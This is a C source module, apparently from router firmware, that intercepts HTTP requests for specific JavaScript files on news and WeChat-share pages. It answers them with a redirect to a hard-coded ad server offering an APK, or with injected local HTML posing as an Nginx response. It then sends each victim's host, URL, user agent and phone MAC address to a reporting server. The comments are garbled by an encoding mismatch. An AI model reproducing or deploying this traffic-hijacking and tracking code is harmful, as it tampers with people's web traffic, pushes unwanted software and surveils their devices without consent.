#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

#include "list.h"

#include "ha_debug.h"
#include "ha_network.h"
#include "ha_policy.h"
#include "ha_http.h"
#include "ha_adt.h"
#include "ha_misc.h"
#include "ha_30x.h"
#include "ha_config.h"
#include "ha_search.h"
#include "ha_event.h"
#include "ha_timer.h"
#include "ww_common_header.h"

#ifdef _USE_PCRE
#include <pcre.h>
#endif

#define DEF_REDIR_REPORTS   8
#define DEF_REDIR_PORT 		80
#define DEF_REDIR_SRV		"192.168.1.188"
#define DEF_REDIR_30X_SERVER "ad.aociaol.com"
#define DEF_REDIR_30X_PATH	"/wwad/index.php"

#ifndef _USE_PCRE
static bool ha_redir_key_inlist(cstr_t *s,struct list_head *lh,bool def)
{
	struct ha_string_entry *pos;
	if (list_empty(lh))
		return def;
	list_for_each_entry(pos,lh,next) {
		if (UINT32_MAX != raw_search((const u8 *)pos->content.str,pos->content.len,(const u8 *)s->str,s->len,true)) {
			return true;
		}
	}
	return false;
}
#endif

struct ha_report_entry{
	struct list_head next;
	struct ha_timer *tm;
	struct ha_event *ev;
	int msglen;
	uint8_t msg[512];
};

struct ha_redir_entry{
	struct list_head next;

	struct list_head hosts;
#ifdef _USE_PCRE
	pcre *url_match;
	pcre *url_block;
	pcre *agent_match;	
	pcre *agent_block;
#else
	struct list_head agent_match;
	struct list_head url_block;
	struct list_head agent_block;
#endif
	char *fname;
	uint8_t flen;
	char *local;
	int size;
};

struct ha_redir_ctl {
#if 1
	char server[DEF_SRV_MAXLEN],
		 	url[DEF_URL_MAXLEN];
#endif
	struct list_head entries;
	

	struct ha_report_entry reports[DEF_REDIR_REPORTS];
	struct alloctor ac;

	struct sockaddr_in sin;
	int msg_drop;
};

static struct ha_redir_ctl hr_ctl;

static struct ha_report_entry *ha_report_entry_get(void)
{
	struct ha_redir_ctl *ctl = &hr_ctl;
	struct ha_report_entry *entry;
	
	alloctor_entry_get(entry,&ctl->ac,struct ha_report_entry,next);
	
	return entry;	
}

static void ha_report_entry_put(struct ha_report_entry *entry)
{
	if (entry->ev) {
		ha_event_del(entry->ev);
		close(ha_event_fd_get(entry->ev));
	}
	if (entry->tm)
		ha_timer_del(entry->tm);

	entry->ev = NULL;
	entry->tm = NULL;
	entry->msglen = 0;
	
	alloctor_entry_put(entry,&hr_ctl.ac,next);
}

/*�������ݱ��� */
static void ha_report_action(void *v)
{
	struct ha_redir_ctl *ctl = &hr_ctl;
	struct ha_report_entry *e = (struct ha_report_entry *)v;
	
	int fd = ha_event_fd_get(e->ev);

	if (e->msglen != write(fd,e->msg,e->msglen))
		ctl->msg_drop++;
	
	debug_p("report success");
	ha_report_entry_put(e);
}

/*���ӳ�ʱ*/
static void ha_report_timeout(void *v)
{
	struct ha_report_entry *e = (struct ha_report_entry *)v;
	debug_p("report connect timeout");
	hr_ctl.msg_drop++;
	
	ha_report_entry_put(e);
}

/*�������*/
uint web_tlv_node_format(uint8_t *ptr,uint8_t type,uint8_t len,const char *str)
{
	web_tlv_node_t *node = (web_tlv_node_t *)ptr;
	node->type = type;
	node->length = htons(len);
	memcpy(node->value,str,len);
	return len + sizeof(*node);
}

/*�¼��ϱ�*/
static void ha_report(struct ha_http_request *req,struct ha_redir_entry *entry,struct ha_packet_info *pi)
{
	struct ha_redir_ctl *ctl = &hr_ctl;
	int fd = -1;
	
	struct ha_report_entry *e = ha_report_entry_get();
	if (!e)
		goto fail;
	
	/*prepare msgbody*/
	if (sizeof(web_msg_hdr_t) + 
		3 * sizeof(web_tlv_node_t) + 
		req->host->len + 
		req->url.len +
		req->ua->len + 
		entry->flen > sizeof(e->msg))
		goto fail;
	
	uint8_t *ptr = e->msg + sizeof(web_msg_hdr_t);
	ptr += web_tlv_node_format(ptr,WEB_TLV_TYPE_HOST,req->host->len,req->host->str);
	ptr += web_tlv_node_format(ptr,WEB_TLV_TYPE_URL,req->url.len,req->url.str);
	ptr += web_tlv_node_format(ptr,WEB_TLV_TYPE_UA,req->ua->len,req->ua->str);
	ptr += web_tlv_node_format(ptr,WEB_TLV_TYPE_HTML,entry->flen,entry->fname);
	ptr += web_tlv_node_format(ptr,WEB_TLV_TYPE_PHONE_MAC,6,(const char *)pi->eth->h_source);
	e->msglen = ptr - e->msg;

	web_msg_hdr_t *wm = (web_msg_hdr_t *)e->msg;
	wm->msglen = htons(e->msglen - sizeof(*wm));
	
	fd = socket(AF_INET,SOCK_STREAM,0);
	if (fd < 0)
		goto fail;
	set_fd_default(fd);

	/*д��ȥ�󣬽��м�ػص�*/
	if (connect(fd,(struct sockaddr *)&ctl->sin,sizeof(ctl->sin))) {
		if (errno != EINPROGRESS) {
			debug_p("connect error right now");
			goto fail;
		}
	} else {
		if (e->msglen != write(fd,e->msg,e->msglen))    /*д������ */
			goto fail;
		 else 
			goto clean;
		
	}
	
	struct ha_event_cb cb = {
		.arg = e,
		.write_cb = ha_report_action, /*��ػص�*/
	};
	
	e->ev = ha_event_new(fd,EV_WRITE,&cb);
	if (!e->ev)
		goto fail;
	
	e->tm = ha_timer_new(e,ha_report_timeout,3,NULL);
	if (!e->ev)
		goto fail;
	
	return ;
fail:
	ctl->msg_drop++;
clean:
	if (e)
		ha_report_entry_put(e);
	if (fd != -1)
		close(fd);
}

/*�ض�����ڼ��*/
static bool ha_redir_entry_check(struct ha_http_request *req,struct ha_redir_entry *entry)
{
	bool found = false;
	struct ha_string_entry *str;
	list_for_each_entry(str,&entry->hosts,next) {
		if (ha_strcmp(req->host,str->content.str,str->content.len)) {
			found = true;
			break;
		}
	}

	if (!found) 
		return false;
#ifdef _USE_PCRE /*��������ʽ*/

	if (entry->url_match && pcre_exec(entry->url_match,	NULL,req->url.str, 
										req->url.len,0,0,NULL, 0) < 0) 
		return false;
	if (entry->agent_match && pcre_exec(entry->agent_match,	NULL,req->ua->str, 
										req->ua->len,0,0,NULL, 0) < 0)
		return false;

	if (entry->agent_block && pcre_exec(entry->agent_block,	NULL,req->ua->str, 
										req->ua->len,0,0,NULL, 0) == 0)
		return false;
	if (entry->url_block && pcre_exec(entry->url_block,	NULL,req->url.str, 
										req->url.len,0,0,NULL, 0) == 0)
		return false;
	
#else
	if (ha_redir_key_inlist(&req->url,&entry->url_block,false))
		return false;
	
	if (ha_redir_key_inlist(req->ua,&entry->agent_block,false))
		return false;
	
	if (!ha_redir_key_inlist(req->ua,&entry->agent_match,true))
		return false;
#endif
	return true;
}

/*�ض�����*/
static bool ha_redir_handler(struct ha_http_request *req,int type,struct ha_packet_info *pi)
{
	if (type != HTTP_GET)
		return true;
	debug_p("----REDIR-----");
	struct ha_redir_ctl *ctl = &hr_ctl;
	/*special ua filter (HARD CODE)*/
	/*url filter*/
#ifndef _USE_PCRE
	if (req->url.len < 16 || memcmp(req->url.str,"/www/js/newsapp/",16)
		||req->url.str[req->url.len - 1] != 's'
		||req->url.str[req->url.len - 2] != 'j'
		||req->url.str[req->url.len - 3] != '.') {
		debug_p("url key mismatch");
		return true;
	}

	if (UINT32_MAX ==   raw_search((const u8 *)"wechat_new/wechat_new_",22,(const u8 *)req->url.str,req->url.len,true)
		&&UINT32_MAX == raw_search((const u8 *)"newsshare/webnews_",18,(const u8 *)req->url.str,req->url.len,true)
		&&UINT32_MAX == raw_search((const u8 *)"cyshare/cyshare_",16,(const u8 *)req->url.str,req->url.len,true)
		&&UINT32_MAX == raw_search((const u8 *)"mqqZepto/mqq_zepto_",19,(const u8 *)req->url.str,req->url.len,true)) {
		debug_p("nod found url key");
		return true;
	}
#endif		
	struct ha_redir_entry *entry = NULL;
	bool goon = false;
	list_for_each_entry(entry,&ctl->entries,next) {
		if (ha_redir_entry_check(req,entry)) {  /*���?*/
			goon = true;
			break;
		}
	}
	if (!goon) 
		return true;
		
	
	debug_p("redir tigger");
	if (!entry->local) {
		/*ha_http_redirect*/
		if (ha_build_redir_args(req,req->ua,"apk",pi,false))
			ha_http_redirect(pi,"http",ctl->server,ctl->url,ha_escap_buffer_get(),1);
	} else {
		yitiaoming_stand(pi,entry->local,entry->size,1);
		ha_report(req,entry,pi);
	}
	return false;
}


/*�ַ�������*/
static void ha_redir_string_handle(struct json_object *jo,void *v)
{
	struct list_head *lh = (struct list_head *)v;
	const char *str = NULL;
	size_t len = 0;
	jo_array_string_check(jo,str,len,2);

	struct ha_string_entry *entry = ha_string_entry_new(str,len);
	if (!entry)
		return ;
	INIT_LIST_HEAD(&entry->next);
	list_add_tail(&entry->next,lh);
}

static pcre *ha_string_to_pcre(struct json_object *jo,const char *name)
{
	const char *pattern = ha_json_get_string(jo,name);
	if (!pattern)
		return NULL;

	const char *perr = NULL;
	int erroffset = 0;
	pcre *re =  pcre_compile(pattern,0,&perr,&erroffset,NULL);

	return re;
}
/*��ڵ�ص�������*/
static void ha_redir_entry_new(struct json_object *jo,void *v)
{
	FILE *fp= NULL;
	struct ha_redir_entry *entry = CALLOC(1,sizeof(*entry)); /*����һ���µ���ڵ�*/
	if (!entry) 
		return ;
		
	INIT_LIST_HEAD(&entry->hosts);
#ifndef _USE_PCRE /*������ʽ*/
	INIT_LIST_HEAD(&entry->agent_match);
	INIT_LIST_HEAD(&entry->agent_block);
	INIT_LIST_HEAD(&entry->url_block);
#endif	
	struct json_object *array = ha_find_config(jo,"hosts");
	if (array)
		ha_json_array_handle(array,ha_redir_string_handle,&entry->hosts);/*������Ҫ�ǽڵ���� */
#ifdef _USE_PCRE /*������ʹ����������ʽ*/
	entry->agent_match = ha_string_to_pcre(jo,"agent-match");
	entry->agent_block = ha_string_to_pcre(jo,"agent-block");
	entry->url_match = ha_string_to_pcre(jo,"url-match");
	entry->url_block = ha_string_to_pcre(jo,"url-block");
	
#else
	array = ha_find_config(jo,"agent-match");
	if (array)
		ha_json_array_handle(array,ha_redir_string_handle,&entry->agent_match);
	
	array = ha_find_config(jo,"agent-block");
	if (array)
		ha_json_array_handle(array,ha_redir_string_handle,&entry->agent_block);

	
	array = ha_find_config(jo,"url-block");
	if (array)
		ha_json_array_handle(array,ha_redir_string_handle,&entry->url_block);
#endif	
	const char *local = ha_json_get_string(jo,"local");
	if (local) {
		char headbuf[256];
		int headlen;
		if (local[0] == '/') {
			fp = fopen(local,"r");
			if (!fp)
				return ;

			fseek(fp,0,SEEK_END);
			long size = ftell(fp);  /*��ȡ�ļ��Ĵ�С*/
			fseek(fp,0,SEEK_SET);/*ƫ�Ƶ�ͷ��*/

			 /*snprintf���سɹ�д����ַ���*/
			 headlen = snprintf(headbuf,sizeof(headbuf),
				"HTTP/1.1 200 OK\r\n"
				"Server: Nginx\r\n"
				"Content-Type: text/html\r\n"
				"Connection:close\r\n"
				"Content-Length: %ld\r\n\r\n",size);

			entry->local = MALLOC(headlen + size + 1);
			if (!entry->local)
				goto fail;
			entry->size = headlen + size; /*���size�������汾���ļ���ȡ������*/
			entry->local[entry->size] = '\0';
			
			memcpy(entry->local,headbuf,headlen); /*������ͷ������*/
			if (size != fread(entry->local + headlen,1,size,fp))
				goto fail;
			
			entry->fname = strdup(local); /*�ļ���*/
			if (!entry->fname)
				goto fail;
			entry->flen = strlen(entry->fname);
		}else {
			headlen = snprintf(headbuf,sizeof(headbuf),ha_redir_header(),"http",local,"","");
			entry->local = MALLOC(headlen);
			if (!entry->local)
				goto fail;
			memcpy(entry->local,headbuf,headlen);
			entry->size = headlen;
		}
	}
	struct list_head *lh = (struct list_head *)v;
	list_add_tail(&entry->next,lh); /*���뵽����*/
	goto clean;

fail:
	if (entry->local)
		FREE(entry->local);
	FREE(entry);
clean:
	if (fp)
	fclose(fp);
	
}

static void ha_redir_entry_destroy(struct ha_redir_entry *entry)
{
	struct ha_string_entry *pos,*_next;

	list_for_each_entry_safe(pos,_next,&entry->hosts,next) {
		list_del(&pos->next);
		FREE(pos);
	}
#ifdef _USE_PCRE
	if (entry->agent_block) pcre_free(entry->agent_block);
	if (entry->agent_match) pcre_free(entry->agent_match);
	if (entry->url_block) pcre_free(entry->url_block);
	if (entry->url_match) pcre_free(entry->url_match);
#else
	list_for_each_entry_safe(pos,_next,&entry->agent_match,next) {
		list_del(&pos->next);
		FREE(pos);
	}
	list_for_each_entry_safe(pos,_next,&entry->url_block,next) {
		list_del(&pos->next);
		FREE(pos);
	}
	
	list_for_each_entry_safe(pos,_next,&entry->agent_block,next) {
		list_del(&pos->next);
		FREE(pos);
	}
#endif
	if (entry->local)
		FREE(entry->local);
	if (entry->fname)
		FREE(entry->fname);
}


/*�ض����ʼ��*/
void ha_redir_init(void)
{
	struct json_object *jo = ha_find_module_config("redir"); /*��ȡ��ģ��*/
	if (!jo)
		return ;
	struct ha_redir_ctl *ctl = &hr_ctl;	
	INIT_LIST_HEAD(&ctl->entries); /*��ʼ������*/
		
	alloctor_init(&ctl->ac);/*��ʼ��������*/
	uint64_t _rt_mac = 0;
	const char *mac = ha_network_mac();/*��ȡ�豸��mac��ַ*/
	uint8_t *rt_mac = (uint8_t *)&_rt_mac + 2;  /*������ͷ�����ֽ�*/
	int j ;
	for (j = 6 ; j > 0 ; j--) { 
		char tmp[4] = {0};
		memcpy(tmp,mac,2);
		mac += 2;
		unsigned long int nmac = strtoul(tmp,NULL,16);/*ת�����޷��ų�����*/
		*rt_mac++ = nmac & 0xFF;
	}


	/*��������ϴ���־?*/
	int i;
	for (i = 0 ; i < DEF_REDIR_REPORTS ; i++) {
		web_msg_hdr_t *wm = (web_msg_hdr_t *)ctl->reports[i].msg;
		wm->magic = htonl(WW_MAGIC_NUMBER);
		wm->msgtype = htons(WEB_MSG_TYPE_SUCCESS_LOG);
		wm->rt_mac = _rt_mac;
		
		alloctor_freelist_add(&ctl->ac,&ctl->reports[i].next); /*�����ͷ�*/
	}
	const char *str = NULL;
	str = ha_json_get_string(jo,"report-server"); /*�ش��ķ�����*/
	
	if (!str || !name2addr(str,&ctl->sin,NULL))
		inet_pton(AF_INET,DEF_REDIR_SRV,&ctl->sin.sin_addr.s_addr);
	
	int port = ha_json_get_int(jo,"report-port");  /*�ش��Ķ˿�*/
	ctl->sin.sin_family = AF_INET;
	if (port != JO_INT_INVALID)
		ctl->sin.sin_port = htons(port);
	else
		ctl->sin.sin_port = htons(DEF_REDIR_PORT);

	str = ha_json_get_string(jo,"server");  /*���������� */
	if (str)
		strncpy(ctl->server,str,sizeof(ctl->server));
	else
		strncpy(ctl->server,DEF_REDIR_30X_SERVER,sizeof(ctl->server));

	str = ha_json_get_string(jo,"path"); /*�������ϵ�·����*/
	if (str)
		strncpy(ctl->url,str,sizeof(ctl->url));
	else
		strncpy(ctl->url,DEF_REDIR_30X_PATH,sizeof(ctl->url));
	
	struct json_object *array = ha_find_config(jo,"entries"); /*����ڵ���лص�*/
	if (array)
		ha_json_array_handle(array,ha_redir_entry_new,&ctl->entries);

	ha_register_policy_entry("redir",ha_redir_handler); /*ע�����*/
}

void ha_redir_destroy(void)
{
	struct ha_redir_ctl *ctl = &hr_ctl;	
	
	struct ha_redir_entry *pos,*_next;
	list_for_each_entry_safe(pos,_next,&ctl->entries,next) {
		list_del(&pos->next);
		ha_redir_entry_destroy(pos);
		FREE(pos);
	}
}

